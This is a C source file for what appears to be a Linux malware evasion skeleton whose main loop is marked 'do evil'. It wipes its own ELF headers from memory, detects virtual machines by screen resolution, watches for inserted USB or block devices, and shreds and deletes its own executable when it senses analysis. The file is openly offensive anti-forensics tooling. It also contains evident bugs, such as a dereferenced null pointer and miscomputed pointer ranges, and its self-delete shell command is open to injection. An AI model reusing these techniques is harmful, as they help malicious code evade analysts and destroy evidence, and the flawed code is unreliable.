#include <stdio.h> 
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <X11/Xlib.h>

#define RMLength 3
#define shredLength 6
#define LinkBuff 150
#define BlockOutSize 200

#define ELFHeaderLength 0x40
#define ProgramHeaderLength 0x38
#define SectionHeaderLength 0x40
#define AddressLength 12
#define SecondAddressOffset (AddressLength + 1)

#define FileLineBuff 150
typedef int WORD;

#define NoSpooks 0
#define SpookAssert 1
#define SearchAndDestroyError 2
#define VMSpookError 3
#define BlockSpookError 4
#define SelfDestructError 5

int SearchAndDestroy(void)
{
	FILE *filePointer;
	char line[FileLineBuff];
	char lastLine[FileLineBuff];
	char addressStr[AddressLength + 1];
	long int addressInt;
	WORD *start;
	WORD *end;

	// open /proc/self/maps file
	filePointer = fopen("/proc/self/maps", "r");
	if (filePointer == NULL)
	{
		return SearchAndDestroyError;
	}
	printf("\t[*] Opened /proc/self/maps\n");
	
	// read the first address from first line from /proc/self/maps into address array  
	fgets(line, FileLineBuff * sizeof(char), filePointer);
	
	memcpy(addressStr, line, AddressLength);
	addressStr[AddressLength] = 0x00;
	printf("\t[*] Start Address Str Found: 0x%s\n", addressStr);

	// make hex then make pointer
	addressInt = strtol(addressStr, NULL, 16);
	printf("\t[*] Start Address Int Found: %lx\n", addressInt);
	start = (WORD *) addressInt;
	printf("\t[*] Start Address Found: %p\n", start);

	// trace through until the last line is found
	for (; (strstr(line, "MangleS.elf")) != NULL; fgets(line, FileLineBuff * sizeof(char), filePointer))
	{
		memcpy(lastLine, line, FileLineBuff);
	}
	memcpy(addressStr, &lastLine[SecondAddressOffset], AddressLength);
	addressStr[AddressLength] = 0x00;
	printf("\t[*] End Address Str Found: 0x%s\n", addressStr);

	// make hex then make pointer
	addressInt = strtol(addressStr, NULL, 16);
	printf("\t[*] Start Address Int Found: %lx\n", addressInt);
	end = (WORD *) addressInt;
	printf("\t[*] End Address Found: %p\n", end);

	// close file stream
	fclose(filePointer);

	// allow write to header spaces with mprotect
	mprotect(start, ELFHeaderLength + ProgramHeaderLength, PROT_WRITE);

	// clear ELF & Program Headers
	for (int i = 0; i < (ELFHeaderLength + ProgramHeaderLength); i++)
	{
		*(start + i) = 0;
		printf("\t[*] Clearing start address <+%02x>%p\n", i, start + i);
	}
	printf("\t[*] Done Flushing ELF and Program Headers\n");

	// disallow write & allow SectionHeader write
	mprotect(start, ELFHeaderLength + ProgramHeaderLength, PROT_READ);
	printf("\t[*] Disabled write to ELF and Program Headers\n");
	mprotect(end - SectionHeaderLength, SectionHeaderLength, PROT_WRITE);
	printf("\t[*] Enabled write to Section Header\n");

	// clear Section Header
	for (int i = 0; i < SectionHeaderLength; i++)
	{
		*(end - SectionHeaderLength + i) = 0;
		printf("\t[*] Clearing end address <+%02x>%p\n", i, end + i);
	}
	printf("\t[*] Done Flushing Section Headers\n");
	mprotect(end - SectionHeaderLength, SectionHeaderLength, PROT_READ);
	printf("\t[*] Disabled write to Section Header\n");
	return 0;
}

int VMSpook(void)
{
	Display *display;
	char *displayName = NULL;

	// get display connection
	display = XOpenDisplay(displayName);
	if (!display)
	{
		return VMSpookError;
	}

	printf("\t[*] Opened XDisplay\n\t\tWidth = %d\n\t\tHeight = %d\n", DisplayWidth(display, 0), DisplayHeight(display, 0));
	// Check resolution against 1024*768; VBox default
	if (DisplayWidth(display, 0) == 1024)
	{
		if (DisplayHeight(display, 0) == 768)
		{
			XCloseDisplay(display);
			printf("\t[X] VM Resolution Fingerprint Found\n");
			return 1;
		}
	}
	printf("\t[*] No VM Resolution Fingerprint Found\n");
	XCloseDisplay(display);
	return 0;
}

int BlockSpook(int *devices)
{
	FILE *filePointer = NULL;
	char blockOut[BlockOutSize];
	int i = 0;

	printf("\t[*] Running lsblk\n");
	filePointer = popen("/bin/lsblk", "r");
	if (filePointer == NULL) 
	{
		return BlockSpookError;
	}
	while (fgets(blockOut, BlockOutSize * sizeof(char), filePointer) != NULL) 
	{
		i++;
	}
	printf("\t[*] lsblk returned %d line(s)", i);
	if (*devices == 0 || *devices > i)
	{
		pclose(filePointer);
		*devices = i;
		return 0;
	}
	else if (*devices < i)
	{
		printf("\t[X] Block Device Inserted, Terminating\n");
		pclose(filePointer);
		return 1;
	}
	else
	{
		pclose(filePointer);
		return 0;
	}
}

int SelfDestruct(void)
{
	printf("\t[X] Spook Found, Self Destructing...\n");
	FILE *filePointer;
	char linkDir[LinkBuff];
	char *linkName = "/proc/self/exe";
	char rmCommand[RMLength + LinkBuff] = "rm ";
	char shredCommand[shredLength + LinkBuff] = "shred ";

	// open /proc/self/exe 
	filePointer = fopen(linkName, "r");
	if (filePointer == NULL)
	{
		fclose(filePointer);
		return SelfDestructError;
	}

	// read the symlink and close file
	realpath(linkName, linkDir);
	fclose(filePointer);


	printf("\t[*] Found Exe Location %s", linkDir);
	// execute shred command
	strcat(rmCommand, linkDir);
	strcat(shredCommand, linkDir);
	system(shredCommand);
	system(rmCommand);
	printf("\t[*] Successfully Shredded and Rm'd File\n");

	exit(0); 
}

int SpookHandle(int spookError)
{
	/* 
	Return Codes:
		0 == NoSpooks
		1 == SpookAssert
		2 == SearchAndDestroyError
		3 == VMSpookError
		4 == BlockSpookError
		5 == SelfDestructError
	2-6 will cause exit(0) still
	*/
	sw: switch(spookError)
	{
		case NoSpooks:
			break;		
		case SpookAssert:
			printf("\t[X] Spook Found, Exiting\n");
			spookError = SelfDestruct();
			goto sw;
		case SearchAndDestroyError:
			printf("\t[X] SearchAndDestroyError, Exiting\n");
			spookError = SelfDestruct();
			goto sw;
		case VMSpookError:
			printf("\t[X] VMSpookError, Exiting\n");
			spookError = SelfDestruct();
			goto sw;
		case BlockSpookError:
			printf("\t[X] BlockSpookError, Exiting\n");
			spookError = SelfDestruct();
			goto sw;
		case SelfDestructError:
			printf("\t[X] SelfDestructError, Exiting\n");
			exit(1);
	}
	return 0;
}

int main(void)
{	
	int *devices = 0;

	SpookHandle(SearchAndDestroy());
	SpookHandle(VMSpook());
	
	// do evil
	while (1)
	{
		SpookHandle(BlockSpook(devices));
		printf("\t[*] Doing Evil\n");
		sleep(1);
	}	
	return 0;
}